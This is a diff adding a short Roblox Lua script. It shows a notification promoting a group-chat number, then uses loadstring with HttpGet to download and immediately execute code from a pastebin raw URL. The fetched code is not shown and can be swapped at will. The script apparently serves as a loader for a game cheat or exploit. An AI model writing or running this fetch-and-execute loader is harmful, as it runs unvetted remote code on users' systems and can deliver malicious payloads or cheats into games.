@@ -1,0 +1,9 @@
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("StarterGui")
+CoreGui:SetCore("SendNotification", {
+    Title = "QB",
+    Text = "最新群聊959236203",
+    Duration = 3,
+})
+ 
+loadstring(game:HttpGet"https://pastebin.com/raw/fSbnAgMj")()
